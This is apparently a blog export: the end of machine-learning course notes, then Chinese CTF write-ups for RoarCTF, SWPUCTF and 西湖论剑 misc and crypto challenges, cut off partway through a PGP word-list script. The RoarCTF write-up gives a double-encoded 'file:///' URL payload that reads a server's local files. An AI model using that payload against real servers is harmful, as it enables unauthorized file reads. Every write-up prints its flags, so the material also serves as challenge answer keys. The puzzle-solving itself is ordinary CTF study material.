^{(m)}$}  STEP:\nRandomly initialize K cluster centroids $\\mu_1\\mu_2\u0026hellip;\\mu_K$\nRepeat:{\nfor i 1 to m: $c ^{(i)} = $index(for 1 to K) of cluster centroid closest to $x ^{(i)}$ [cluster assignment step]\nfor k = 1 to K: $\\mu_k$ = average(mean) of points assigned to cluster k [move centroid step]\n}\nK-means for non-separated clusters\nLike T-shirt sizing problem. You have many body shape and you need to decide how much clusters you need like S,M,L,XL. Then use algorithm to separate them.\n13.3 Optimization Objective $\\mu_{c ^{(i)} }$ = cluster centroid of cluster to which example $x ^{(i)}$ has been assigned\n$x ^{(i)}$ is the training point , we want to minimize the sum of distance between points and cluster centroid\n13.4 Random Initialization Randomly pick K training examples.\nSet $\\mu_1,\u0026hellip;\\mu_k$ equal to these K examples.\nLocal optima:\ninitialize K-means lots of times and run K-means lots of times\nfor ( initialize, run K-means ,compute cost function)\npick clustering that gave lowest cost\n13.5 Choosing the Number of Clusters Elbow method:\nSometimes, you\u0026rsquo;re running K-means to get clusters to use for some later/downstream purpose. Evaluate K=means based on a metric for how well it performs for that later purpose.\n14. Dimensionality Reduction 14.1 Motivation I—— Data Compression Reduce data from 2D to 1D:\nReduce data from 3D to 2D:\nAll these data maybe all of this data maybe lies roughly on the plane. And what we can do with dimensionality reduction is take all of this data and project the data down onto a two dimensional plane.\n14.2 Motivation II——Visualization Application of dimensionality reduction——visualize the data. For a lot of machine learning applications, it helps us to develop effective learning algorithms. if we can understand our data better, there is some way of visualizing the data better, and so, dimensionality reduction offers us another useful tool to do so.\nIf we can use z1 an z2 to summarizes 50 numbers, then plot these countries in R2 and the understand this sort of features of different countries will be better. What you can do is reduce the data from 50D to 2D. z1 and z2 doesn\u0026rsquo;t astride a physical meaning.\n14.3 Principal Component Analysis Problem Formulation Let try to formulate precisely exactly what we would like PCA to do.\nPCA tries to find a lower-dimensional surface onto which to project the data.\nReduce from 2D to 1D: find a direction onto thich to project the data so as to minimize the projection error.\nReduce from nD to kD: find k vectors onto which to project the data so as to minimize the projection error. (3D to 2D together vectors define a plain or 2D surface)\nPCA\u0026amp;LR\nLR fitting a straight line so as to minimize the squared error between a point and the straight line. Notice we drawing distance vertically(point and the point on the line). PCA tries to minimize the shortest orthogonal distances( point and line)\n14.4 Principal Component Analysis Algorithm Before applying PCA, there is a data pre-processing step which you should always do.\nPreprocessing(features scaling/mean normalization): First compute the mean of each feature $\\mu_j = \\frac1m\\sum ^m_{i=1}x_j ^{(i)}$ and replace each feature $x_j = x_j-\\mu_j$.\nCompute covariance matrix: $\\Sigma = \\frac1m\\sum ^n_{i=1}(x ^{(i)})(x ^{(i)}) ^T$\nCompute eigenvectors: [U,S,V] = svd(Sigma) [svd:singular value decomposition]\nS is a Diagonal matrix.\nU is a NxN dimensional vector, reduce to k dimensional vector\n$z ^{(i)}=U ^T_{reduce}*x ^{(i)}$\n14.5 Choosing The Number Of Principal Components Choosing k(number of principle components)\nAverage squared projection error:\nTotal variation in the data:\nTypically, choose k to be smallest value so that\n$\\frac{\\text{Average squared projection error} } {\\text{Total variation in the data} }\u0026lt;=0.01$ (99% of variance is retained)\nRun SVD once and you get Diagonal matrix, then calculate k.\n$\\frac {\\Sigma ^k_{i=1}s_{ii} }{\\Sigma ^n_{i=1}s_{ii}}\\geq0.99$\n14.6 Reconstruction from Compressed Representation 14.7 Advice for Applying PCA Speedup supervised learning:\n100x100 pictures\n Apply PCA and reduce to 1000 dimensional features vectors. Feed new training set to a learning algorithm. For example X, map it through the same mapping that was found by PCA to get corresponding Z and fed to hypothesis and make a prediction.  Application of PCA\n Compression(Choose K by percentage of variance retained)  Reduce memory/disk needed to store data Speed up learning algorithm   Visualization(k=2 or k=3)  Bad use of PCA: To prevent over-fitting\nUse $z ^{(i)}$ instead of $x ^{(i)}$ to reduce the number of features to k \u0026lt; n. (fewer features, less likely to over-fit). Actually isn\u0026rsquo;t a good way to address over-fitting. Use regularization instead. Why? PCA throws away some information, reduce dimension of your data without knowing what the values of y is. It might also throw away some valuable information. Use regularization will often gives you at least as good a method for preventing over-fitting.\nOften at very start of a project, someone will just write out a project plan and use PCA inside. How about doing the whole thing without using PCA? Before implementing PCA, first try running whatever you want to do with original/raw data $x ^{(i)}$. Only if that doesn\u0026rsquo;t do what you want, then implement PCA and consider using $z ^{(i)}$.\n15. Anomaly Detection Anomaly Detection is mainly for unsupervised problem, that there\u0026rsquo;s some aspects of it that are also very similar to sort of the supervised learning problem.\n15.1 Problem Motivation Density estimation:\ndataset: {$x ^{(1)},x ^{(2)},x ^{(3)},\u0026hellip;.x ^{(m)}$}\n$if \\quad p(x) \\begin{cases} \u0026lt; \\varepsilon \u0026amp; anomaly \\\\ \u0026gt; =\\varepsilon \u0026amp; normal \\end{cases}$\nAnomaly detection example:\n15.2 Gaussian Distribution Gaussian distribution = Normal distribution\n$x \\sim N(\\mu, \\sigma ^2)$\n$p(x,\\mu,\\sigma ^2)=\\frac{1}{\\sqrt{2\\pi}\\sigma}\\exp\\left(-\\frac{(x-\\mu) ^2}{2\\sigma ^2}\\right)$\n$\\mu=\\frac{1}{m}\\sum\\limits_{i=1} ^{m}x ^{(i)}$\n$\\sigma ^2=\\frac{1}{m}\\sum\\limits_{i=1} ^{m}(x ^{(i)}-\\mu) ^2$\n15.3 Algorithm Apply Gaussian distribution to develop an anomaly detection algorithm.\nGiven dataset $x ^{(1)},x ^{(2)},\u0026hellip;,x ^{(m)}$, which is distributed according to a Gaussian distribution. So $\\mu_j=\\frac1m\\sum\\limits_{i=1} ^mx_j ^{(i)}$ and $\\sigma_j ^2=\\frac1m\\sum\\limits_{i=1} ^m(x_j ^{(i)}-\\mu_j) ^2$. These data may be vectorized versions.\nCompute p(x).\n$p(x)=\\prod\\limits_{j=1} ^np(x_j;\\mu_j,\\sigma_j ^2)=\\prod\\limits_{j=1} ^1\\frac{1}{\\sqrt{2\\pi}\\sigma_j}exp(-\\frac{(x_j-\\mu_j) ^2}{2\\sigma_j ^2})$. It is anomaly if $p(x) \u0026lt; \\epsilon$.\nThe height of this 3-D surface is p(x). To check a point is anomaly or not, we set some very small value for epsilon, and then compute p(x) of the point. If p(x) greater than or equal to epsilon, then we think it is not an anomaly. But if p(x) is smaller then epsilon, that is indeed an anomaly.\n15.4 Developing and Evaluating an Anomaly Detection System How to develop a specific anomaly detection algorithm\nHow to evaluate an anomaly detection algorithm\nAssume we have some labeled data, of anomalous and non-anomalous examples.\nAnd we are going to define a cross validation set and a test set, with which to evaluate a particular anomaly detection algorithm.\nExample:\n10000 good engines and 20 flawed engines\nTraining set: 6000 good engines\nCV: 2000 good engines(y=0) 10 anomalous(y=1)\nTest: 2000 good engines(y=0) 10 anomalous(y=1)\nGet training set and fit p(x)\nEvaluate: It is a very skewed data set, then predicting y equals 0 all the time will have very high classification accuracy. Instead, we should use evaluation metrics like computing the Precision/Recall or do things like compute the F1 score, which is a single real-number way of summarizing the precision and the recall numbers.\nUse cross validation set to choose parameter $\\epsilon$ which maximizes F1 score or the otherwise does well on your cross validation sets.\n15.5 Anomaly Detection vs. Supervised Learning If we have this labeled data, we have some examples that are known to be anomalies and some that are known not to be not anomalies, why don\u0026rsquo;t we just use a supervised learning algorithm, so why don\u0026rsquo;t we just use logistic regression or a neural network to try to learn directly from our labeled data, to predict whether y equals one or y equals zero?\n   Anomaly Detection Supervised Learning     Very small number of positive examples. Large number of negative examples. Large number of positive and negative examples simultaneously.   Many different \u0026ldquo;types\u0026rdquo; of anomalies. Hard for any algorithm to learn from positive examples what the anomalies look like. Enough positive examples for algorithm to get a sense of what positive examples are like.   Future anomalies mat look nothing like any of the anomalous examples we\u0026rsquo;ve seen so far. Future positive examples likely to be similar to ones in training set.   Examples: Fraud detection, Manufacturing(aircraft engines), Monitoring machines in a data center Examples: Email spam problem, Weather prediction, Cancer classification    15.6 Choosing What Features to Use You have seen the anomaly detection algorithm and we\u0026rsquo;ve talked about how to evaluate an anomaly detection algorithm.\nIt turns out that when you\u0026rsquo;re applying anomaly detection, one of the things that has a huge effect on how well it does, is what features you use, and what features you choose, to give the anomaly detection algorithm.\nTransformations of the data in order to make it look more Gaussian might work a bit better.\nWe can use log function($x = log(x+c), c\u0026gt;=0$) to transform the data, function in python np.log1p = log(x+1)\nError analysis for anomaly detection\nrun on CV and look at the examples it gets wrong and come up with extra features to help algorithm.\nMonitoring computers in a data center\nChoose features that might take on unusually large or small values on the event of an anomaly.\n$x_1$ = memory use of computer\n$x_2$ = number of disk accesses/sec\n$x_3$ = CPU load\n$x_4$ = network traffic\nto check infinite loop, we may need a new feature $x_5 = \\frac{x_3}{x_4}$. this may take on a unusually large value if one of the machines has a very large CPU load but not that much network traffic. So that will help your anomaly detection capture, a certain type of anomaly.\n15.7 Multivariate Gaussian Distribution (Optional) 15.8 Anomaly Detection using the Multivariate Gaussian Distribution (Optional) 16. Recommender Systems 16.1 Problem Formulation Recommender systems is an important application of machine learning.\nThrough recommender systems, will be able to go a little bit into this idea of learning the features.\nRecommender systems look at what books you may have purchased in the past, or what movies you have rated.\nAnd so, our job in developing a recommender system is to come up with a learning algorithm that can automatically go fill in these missing values.\n16.2 Content Based Recommendations If we have features like these then each movie can be represented with a feature vector.\nWe could treat predicting the ratings of each user as a separate linear regression problem.\nFor each user j, learn a parameter $\\Theta ^{(j)} \\in \\mathbb{R} ^3$. Predict user j as rating movie i with $(\\Theta ^{(j)} ) ^Tx ^{(i)}$ stars.\n16.3 Collaborative Filtering we\u0026rsquo;re talking a recommender system that\u0026rsquo;s called collaborative filtering, which start to learn for itself what features to use.\nKnow $\\Theta$ in advance, we can get the features X since $(\\Theta ^{(j)} ) ^Tx ^{(i)} = movie ratings$.\n16.4 Collaborative Filtering Algorithm  Initialize $x ^{(1)}\u0026hellip;x ^{(n_m)},\\Theta ^{(1)}\u0026hellip;\\Theta ^{(n_m)}$ to small random values. Minimize $J(x ^{(1)}\u0026hellip;x ^{(n_m)},\\Theta ^{(1)}\u0026hellip;\\Theta ^{(n_m)})$ using gradient descent(or an advanced optimization algorithm). For a user with parameters $\\Theta$ and a movie with(learned) features x, predict a star rating of $\\Theta ^Tx$.  16.5 Vectorization——Low Rank Matrix Factorization Like matrix multiplication\nFinding related movies:\nFor each product i, we learn a feature vector $x ^{(i)}$.\nsmall $|x ^{(i)}-x ^{(j)}|$ ——\u0026gt; movie j and movie i are \u0026ldquo;similar\u0026rdquo;.\n16.6 Implementation Detail——Mean Normalization If user Eve hasn\u0026rsquo;t rated any movies. The only Influential part is the last part. We want to choose vector theta 5 so that the last regularization term is as small as possible. We would end up getting a $\\Theta$ that is all 0.\nThe idea of mean normalization will let us fix this problem.\nI\u0026rsquo;m going to compute the average rating($\\mu$) that each movie obtained. All the movie ratings subtract off the mean rating.\nSo, what I\u0026rsquo;m doing is just normalizing each movie to have an average rating of zero.\nNow use this set of ratings with my collaborative filtering algorithm. Our last prediction should be $(\\theta ^{(j)})^T x ^{(i)}+\\mu_i$. This mean user Eve will get the average rating.\n17. Large Scale Machine Learning 17.1 Learning With Large Datasets Before investing the effort into actually developing and the software needed to train these massive models is often a good sanity check, if training on just a thousand examples might do just as well.\nIf we have a high variance model, we may need large datasets.\nIf we have a high bias model, large datasets may don\u0026rsquo;t help.\nSo in large-scale machine learning, we like to come up with computationally reasonable ways, or computationally efficient ways, to deal with very big data sets.\n17.2 Stochastic Gradient Descent we\u0026rsquo;ll talk about a modification to the basic gradient descent algorithm called Stochastic gradient descent, which will allow us to scale these algorithms to much bigger training sets.\nIf dataset is large, it\u0026rsquo;s gonna take a long time in order to get the algorithm to converge.(Batch gradient descent)\nIn contrast to Batch gradient descent, what we are going to do is come up with a different algorithm that doesn\u0026rsquo;t need to look at all the training examples in every single iteration, but that needs to look at only a single training example in one iteration.(Stochastic gradient descent)\n17.3 Mini-Batch Gradient Descent Batch gradient descent: Use all m examples in each iteration\nStochastic gradient descent: Use 1 example in each iteration\nMini-batch gradient descent: Use b examples in each iteration\nb = mini-batch size usually b=10(2-100)\nWhy do we want to look at b examples at a time rather than look at just a single example at a time as the Stochastic gradient descent?\nThe answer is in vectorization.\nMini-batch gradient descent is likely to outperform Stochastic gradient descent only if you have a good vectorized implementation. In that case, the sum over 10 examples can be performed in a more vectorized way which will allow you to partially parallelize your computation over the ten examples.\n17.4 Stochastic Gradient Descent Convergence By using a smaller learning rate, you\u0026rsquo;ll end up with smaller oscillations.\nTo get a smoother curve, you need to increase the number of examples.\nWhen curve looks like it\u0026rsquo;s increasing, what you really should do is use a smaller value of the learning rate alpha.\nIf you want stochastic gradient descent to actually converge to the global minimum, there\u0026rsquo;s one thing which you can do which is you can slowly decrease the learning rate alpha over time.$\\alpha = \\frac{const1}{iterationNumber + const2}$\n17.5 Online Learning For a continuous stream of data from online website.\nWhen a user come in the website, we get a example (x,y) and learn from that and discard it.\nThis sort of online learning algorithm can also adapt to changing user preferences and kind of keep track of what your changing population of users may be willing to pay for.\nThe problem of learning the predicted click-through rate, the predicted CTR.\n17.6 Map Reduce and Data Parallelism Assign tasks to multiple computers on average then centralized master server combine results together.\nOn a single multi-core computer, you can split the training sets into pieces and send the training set to different cores within a single box.\nwe talked about the MapReduce approach to parallelizing machine learning by taking a data and spreading them across many computers in the data center. Although these ideas are critical to parallelizing across multiple cores within a single computer as well.\n18. Application Example: Photo OCR 18.1 Problem Description and Pipeline Photo OCR stands for Photo Optical Character Recognition. The photo OCR problem focuses on how to get computers to read the text to the purest in images that we take.\nFirst, given the picture it has to look through the image and detect where there is text in the picture.\nRead the text in those regions.\nDoing OCR from photographs today is still a very difficult machine learning problem.\nPhoto OCR pipeline:\n Text detection Character segmentation Character classification  18.2 Sliding Windows Pedestrian detection:\nSupervised learning for pedestrian detection(sliding windows classifier)\nshift the rectangle over each time is a parameter called the step size(also called the slide parameter)\nwe can choose a big rectangle and resize to the smaller one and get it detected by classifier.\nText detection:\n use classifier to get the possibility of text apply expansion operator and expand white pixel rule out strange rectangles and draw rectangles around text  How do we segment out the individual characters in this image?\nuse a supervised learning to decide if there is split between two characters\n18.3 Getting Lots of Data and Artificial Data One of the most reliable ways to get a high performance machine learning system is to take a low bias learning algorithm and to train it on a massive training set. But where did you get so much training data from?\nArtificial data synthesis [creating new data from scratch, amplify that training set or turn to a large one]\nCreate new: downloaded font\nAmplify: artificial stretching or artificial distortions\nDiscussion on getting more data:\n Make sure you have a low bias classifier before expending the effort. (Plot learning curves). E.g. keep increasing the number of features/number of hidden units in neural network until you have a low bias classifier. “How much work would it be to get 10x as much data as we currently have?”   Artificial data synthesis Collect/label it yourself Crowd source(E.g. Amazon Mechanical Turk)  18.4 Ceiling Analysis——What Part of the Pipeline to Work on Next   go to my test set and just give it the correct answers for the text detection part of the pipeline.\n  And now going to give the correct text detection output and give the correct character segmentation outputs and manually label the correct segment orientations of text into individual characters.\n  Now, the nice thing about having done this analysis analysis is we can now understand what is the upside potential for improving each of these components.\ntext detection——17 percent performance gain\ncharacter segmentation——1 percent performance gain\ncharacter recognition——10 percent performance gain\nceiling analysis gives the upside potential\n19. Conclusion 19.1 Summary and Thank You ","description":"","id":13,"section":"posts","tags":["AI","course"],"title":"CS229 Machine Learning——Andrew Ng——Stanford","uri":"https://ruokeqx.gitee.io/posts/machine-learning-andrew-ng-stanford/"},{"content":"2020RoarCTF Misc Writeup 签到 签到比后面难系列.jpg\n1  ?url=file:///%25%36%36%25%36%63%25%36%31%25%36%37   Hi_433MHz 是铁憨憨没错，不看软件提示，建议去爬。\n直接拖到audacity提示如下。\n按照他说的导入文件，明显看到长短，一个九位不是摩斯，八位是二进制，最后一位应该是奇偶校验。\n于是手撸得到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  01100110 01101100 01100001 01100111 01111011 00110010 00110101 01100011 00110010 00110001 01100010 00110000 01100100 00101101 00110110 01100001 00110001 00110001 00101101 00110100 00110011 00110001 00110010 00101101 00111001 00110111 00110001 01100010 00101101 00110100 00110010 00111000 01100100 00110000 00110001 01100011 01100100 01100011 00110101 00110011 00110100 01111101   1  flag{25c21b0d-6a11-4312-971b-428d01cdc534}   FM 软件装了一天，比赛结束后才知道直接听，然而虚拟机声卡被我删了。\n我铁憨憨了，四舍五入也算我ak吧球球了。\n2020SWPUCTF Misc\u0026amp;Crypto Writeup 嘶哄无线电自闭过来随便玩一玩。\nMisc 套娃 1 2  # RC4data.txt U2FsdGVkX19uI2lzmxYrQ9mc16y7la7qc7VTS8gLaUKa49gzXPclxRXVsRJxWz/p   1 2 3 4  # 查看hex得到压缩包密码 6e4c834d77cba03af41e1562a5bce84e # 解压得到rc4key ABCDEFGHIJKLMNOPQRSTUVWXYZ   1 2  # 在线解密得到flag ef1a73d40977a49b99b871980f355757   耗子尾汁 视频中明显有一串东西闪过\n1 2 3 4  # base64 c2lnbl9pbg== # 解密得到 sign_in   视频尾部有个zip用上面密码解压得到如下\n1 2 3  R1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0= //The last layer is the single table replacement password   base64，32然后16进制转字符串\n1 2 3 4  lvueiakxudsyqehszqhykggsyylkvvi fladybuganeshdiephisuccessfully flagyouhavesignedinsuccessfully xxx_xxxx_xxxxxx_xx_xxxxxxxxxxxx   来找我吧 1  key is PPPaAaS   得到findme.mp3和secret.rar,file看一下发现findme.mp3是rar5,改后缀解压得到哈哈哈.png和采茶纪.mp3,secret.rar是真的加密，简单hashcat爆破了一下无解应该是要继续找密码了。\n音频开头有类似于拨号音。\n末尾有一段摩斯密码\n解密得到D43963E92B012AAB 是一条要钱的md5 穷人不配呜呜呜。hash出来是n1ce_try,解压secret.rar得到一个gif和一个png,gif一帧如下图。\n发现hint.png crc不对，修复后得到hint:Veni,Vidi,Vici直接搜索这个hint发现是凯撒\n凯撒得到flag{sWpu_N1c3_Try}\n来猜谜吧 得到probelm.png，用zsteg分出一个zip,其尾部有其他内容，删除即可正常解压。得到uuu.pcap是一个鼠标流量，还有一个mi.jpg。\n1 2  # 鼠标流量如图 AG\u0026lt;SPACE\u0026gt;DX\u0026lt;SPACE\u0026gt;AG\u0026lt;SPACE\u0026gt;DX\u0026lt;SPACE\u0026gt;AG\u0026lt;SPACE\u0026gt;DX   直接对ADFGX表解密得到gogogo\n   \\ A D F G X     A p h q g m   D e a y n o   F f d x k r   G c v s z w   X b u t i l    现在只剩下一个jpg了，带密码的jpg隐写盲猜outguess\n得到flag{Out9uEsS_1s_V4rY_e4sy}\nCrypto happy 签到rsa\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  from z3 import * import gmpy2 from Crypto.Util.number import * c=0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e e=0x872a335 #q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586 # q+q*p**3= #qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594 # q*p+q*p**2 # s = Solver() # p = Int(\u0026#39;p\u0026#39;) # q = Int(\u0026#39;q\u0026#39;) # s.add(q+q*p**3==1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586) # s.add(q*p+q*p**2==1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594) # if s.check() == sat: # print(s.model()) q = 827089796345539312201480770649 p = 1158310153629932205401500375817 n=p*q phi = (p-1)*(q-1) d = gmpy2.invert(e,phi) m = pow(c,d,n) print(long_to_bytes(m))   2020西湖论剑Misc部分wp 说是wp，不如说是被虐记录，啥都没做出来，铁废物了。希望看到的师傅轻点喷。\n希望有师傅能指导一下弟弟，主页有联系方式。\nYusa_yyds 官方wp说的震动一下四个包，咱也不知道，咱也不敢问。\n过滤出xbox的流量\nusb.addr == \u0026quot;2.15.2\u0026quot;\r直接上图，我把时间间隔的第一个包都标记出来，这样就很明显了。\n114514取32位小写md5就是flag\nPS：同学有手柄到时候来试试看\nYusapapa 网页源码有个hint。Biometric list搜到 PGP词汇表，github有解码的，得到如下\n1 2 3  You can see my collection puzzles in /hint.rar and another /encode.png. By the way,the picture shoud be used \u0026#34;Yusa\u0026#34; is very important in this challenge!!   后来自己也写了个脚本，GitHub地址欢迎star\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  cipher = \u0026#34;\u0026#34;\u0026#34; endow gremlin indulge bison flatfoot fallout goldfish bison hockey fracture fracture bison goggles jawbone bison flatfoot gremlin glucose glucose fracture flatfoot indoors gazelle gremlin goldfish bison guidance indulge keyboard keyboard glucose fracture hockey bison gazelle goldfish bison cement frighten gazelle goldfish indoors buzzard highchair fallout highchair bison fallout goldfish flytrap bison fallout goldfish gremlin indoors frighten fracture highchair bison cement fracture goldfish flatfoot gremlin flytrap fracture buzzard guidance goldfish freedom buzzard allow crowfoot jawbone bison indoors frighten fracture bison involve fallout jawbone Burbank indoors frighten fracture bison guidance gazelle flatfoot indoors indulge highchair fracture bison hockey frighten gremlin indulge flytrap bison flagpole fracture bison indulge hockey fracture flytrap bison allow blockade endow indulge hockey fallout blockade bison gazelle hockey bison inverse fracture highchair jawbone bison gazelle goggles guidance gremlin highchair indoors fallout goldfish indoors bison gazelle goldfish bison indoors frighten gazelle hockey bison flatfoot frighten fallout glucose glucose fracture goldfish freedom fracture blackjack blackjack \u0026#34;\u0026#34;\u0026#34; cipher = cipher.split() odd_list = [\u0026#39;aardvark\u0026#39;, \u0026#39;absurd\u0026#39;, \u0026#39;accrue\u0026#39;, \u0026#39;acme\u0026#39;, \u0026#39;adrift\u0026#39;, \u0026#39;adult\u0026#39;, \u0026#39;afflict\u0026#39;, \u0026#39;ahead\u0026#39;, \u0026#39;aimless\u0026#39;, \u0026#39;Algol\u0026#39;, \u0026#39;allow\u0026#39;, \u0026#39;alone\u0026#39;, \u0026#39;ammo\u0026#39;, \u0026#39;ancient\u0026#39;, \u0026#39;apple\u0026#39;, \u0026#39;artist\u0026#39;, \u0026#39;assume\u0026#39;, \u0026#39;Athens\u0026#39;, \u0026#39;atlas\u0026#39;, \u0026#39;Aztec\u0026#39;, \u0026#39;baboon\u0026#39;, \u0026#39;backfield\u0026#39;, \u0026#39;backward\u0026#39;, \u0026#39;banjo\u0026#39;, \u0026#39;beaming\u0026#39;, \u0026#39;bedlamp\u0026#39;, \u0026#39;beehive\u0026#39;, \u0026#39;beeswax\u0026#39;, \u0026#39;befriend\u0026#39;, \u0026#39;Belfast\u0026#39;, \u0026#39;berserk\u0026#39;, \u0026#39;billiard\u0026#39;, \u0026#39;bison\u0026#39;, \u0026#39;blackjack\u0026#39;, \u0026#39;blockade\u0026#39;, \u0026#39;blowtorch\u0026#39;, \u0026#39;bluebird\u0026#39;, \u0026#39;bombast\u0026#39;, \u0026#39;bookshelf\u0026#39;, \u0026#39;brackish\u0026#39;, \u0026#39;breadline\u0026#39;, \u0026#39;breakup\u0026#39;, \u0026#39;brickyard\u0026#39;, \u0026#39;briefcase\u0026#39;, \u0026#39;Burbank\u0026#39;, \u0026#39;button\u0026#39;, \u0026#39;buzzard\u0026#39;, \u0026#39;cement\u0026#39;, \u0026#39;chairlift\u0026#39;, \u0026#39;chatter\u0026#39;, \u0026#39;checkup\u0026#39;, \u0026#39;chisel\u0026#39;, \u0026#39;choking\u0026#39;, \u0026#39;chopper\u0026#39;, \u0026#39;Christmas\u0026#39;, \u0026#39;clamshell\u0026#39;, \u0026#39;classic\u0026#39;, \u0026#39;classroom\u0026#39;, \u0026#39;cleanup\u0026#39;, \u0026#39;clockwork\u0026#39;, \u0026#39;cobra\u0026#39;, \u0026#39;commence\u0026#39;, \u0026#39;concert\u0026#39;, \u0026#39;cowbell\u0026#39;, \u0026#39;crackdown\u0026#39;, \u0026#39;cranky\u0026#39;, \u0026#39;crowfoot\u0026#39;, \u0026#39;crucial\u0026#39;, \u0026#39;crumpled\u0026#39;, \u0026#39;crusade\u0026#39;, \u0026#39;cubic\u0026#39;, \u0026#39;dashboard\u0026#39;, \u0026#39;deadbolt\u0026#39;, \u0026#39;deckhand\u0026#39;, \u0026#39;dogsled\u0026#39;, \u0026#39;dragnet\u0026#39;, \u0026#39;drainage\u0026#39;, \u0026#39;dreadful\u0026#39;, \u0026#39;drifter\u0026#39;, \u0026#39;dropper\u0026#39;, \u0026#39;drumbeat\u0026#39;, \u0026#39;drunken\u0026#39;, \u0026#39;Dupont\u0026#39;, \u0026#39;dwelling\u0026#39;, \u0026#39;eating\u0026#39;, \u0026#39;edict\u0026#39;, \u0026#39;egghead\u0026#39;, \u0026#39;eightball\u0026#39;, \u0026#39;endorse\u0026#39;, \u0026#39;endow\u0026#39;, \u0026#39;enlist\u0026#39;, \u0026#39;erase\u0026#39;, \u0026#39;escape\u0026#39;, \u0026#39;exceed\u0026#39;, \u0026#39;eyeglass\u0026#39;, \u0026#39;eyetooth\u0026#39;, \u0026#39;facial\u0026#39;, \u0026#39;fallout\u0026#39;, \u0026#39;flagpole\u0026#39;, \u0026#39;flatfoot\u0026#39;, \u0026#39;flytrap\u0026#39;, \u0026#39;fracture\u0026#39;, \u0026#39;framework\u0026#39;, \u0026#39;freedom\u0026#39;, \u0026#39;frighten\u0026#39;, \u0026#39;gazelle\u0026#39;, \u0026#39;Geiger\u0026#39;, \u0026#39;glitter\u0026#39;, \u0026#39;glucose\u0026#39;, \u0026#39;goggles\u0026#39;, \u0026#39;goldfish\u0026#39;, \u0026#39;gremlin\u0026#39;, \u0026#39;guidance\u0026#39;, \u0026#39;hamlet\u0026#39;, \u0026#39;highchair\u0026#39;, \u0026#39;hockey\u0026#39;, \u0026#39;indoors\u0026#39;, \u0026#39;indulge\u0026#39;, \u0026#39;inverse\u0026#39;, \u0026#39;involve\u0026#39;, \u0026#39;island\u0026#39;, \u0026#39;jawbone\u0026#39;, \u0026#39;keyboard\u0026#39;, \u0026#39;kickoff\u0026#39;, \u0026#39;kiwi\u0026#39;, \u0026#39;klaxon\u0026#39;, \u0026#39;locale\u0026#39;, \u0026#39;lockup\u0026#39;, \u0026#39;merit\u0026#39;, \u0026#39;minnow\u0026#39;, \u0026#39;miser\u0026#39;, \u0026#39;Mohawk\u0026#39;, \u0026#39;mural\u0026#39;, \u0026#39;music\u0026#39;, \u0026#39;necklace\u0026#39;, \u0026#39;Neptune\u0026#39;, \u0026#39;newborn\u0026#39;, \u0026#39;nightbird\u0026#39;, \u0026#39;Oakland\u0026#39;, \u0026#39;obtuse\u0026#39;, \u0026#39;offload\u0026#39;, \u0026#39;optic\u0026#39;, \u0026#39;orca\u0026#39;, \u0026#39;payday\u0026#39;, \u0026#39;peachy\u0026#39;, \u0026#39;pheasant\u0026#39;, \u0026#39;physique\u0026#39;, \u0026#39;playhouse\u0026#39;, \u0026#39;Pluto\u0026#39;, \u0026#39;preclude\u0026#39;, \u0026#39;prefer\u0026#39;, \u0026#39;preshrunk\u0026#39;, \u0026#39;printer\u0026#39;, \u0026#39;prowler\u0026#39;, \u0026#39;pupil\u0026#39;, \u0026#39;puppy\u0026#39;, \u0026#39;python\u0026#39;, \u0026#39;quadrant\u0026#39;, \u0026#39;quiver\u0026#39;, \u0026#39;quota\u0026#39;, \u0026#39;ragtime\u0026#39;, \u0026#39;ratchet\u0026#39;, \u0026#39;rebirth\u0026#39;, \u0026#39;reform\u0026#39;, \u0026#39;regain\u0026#39;, \u0026#39;reindeer\u0026#39;, \u0026#39;rematch\u0026#39;, \u0026#39;repay\u0026#39;, \u0026#39;retouch\u0026#39;, \u0026#39;revenge\u0026#39;, \u0026#39;reward\u0026#39;, \u0026#39;rhythm\u0026#39;, \u0026#39;ribcage\u0026#39;, \u0026#39;ringbolt\u0026#39;, \u0026#39;robust\u0026#39;, \u0026#39;rocker\u0026#39;, \u0026#39;ruffled\u0026#39;, \u0026#39;sailboat\u0026#39;, \u0026#39;sawdust\u0026#39;, \u0026#39;scallion\u0026#39;, \u0026#39;scenic\u0026#39;, \u0026#39;scorecard\u0026#39;, \u0026#39;Scotland\u0026#39;, \u0026#39;seabird\u0026#39;, \u0026#39;select\u0026#39;, \u0026#39;sentence\u0026#39;, \u0026#39;shadow\u0026#39;, \u0026#39;shamrock\u0026#39;, \u0026#39;showgirl\u0026#39;, \u0026#39;skullcap\u0026#39;, \u0026#39;skydive\u0026#39;, \u0026#39;slingshot\u0026#39;, \u0026#39;slowdown\u0026#39;, \u0026#39;snapline\u0026#39;, \u0026#39;snapshot\u0026#39;, \u0026#39;snowcap\u0026#39;, \u0026#39;snowslide\u0026#39;, \u0026#39;solo\u0026#39;, \u0026#39;southward\u0026#39;, \u0026#39;soybean\u0026#39;, \u0026#39;spaniel\u0026#39;, \u0026#39;spearhead\u0026#39;, \u0026#39;spellbind\u0026#39;, \u0026#39;spheroid\u0026#39;, \u0026#39;spigot\u0026#39;, \u0026#39;spindle\u0026#39;, \u0026#39;spyglass\u0026#39;, \u0026#39;stagehand\u0026#39;, \u0026#39;stagnate\u0026#39;, \u0026#39;stairway\u0026#39;, \u0026#39;standard\u0026#39;, \u0026#39;stapler\u0026#39;, \u0026#39;steamship\u0026#39;, \u0026#39;sterling\u0026#39;, \u0026#39;stockman\u0026#39;, \u0026#39;stopwatch\u0026#39;, \u0026#39;stormy\u0026#39;, \u0026#39;sugar\u0026#39;, \u0026#39;surmount\u0026#39;, \u0026#39;suspense\u0026#39;, \u0026#39;sweatband\u0026#39;, \u0026#39;swelter\u0026#39;, \u0026#39;tactics\u0026#39;, \u0026#39;talon\u0026#39;, 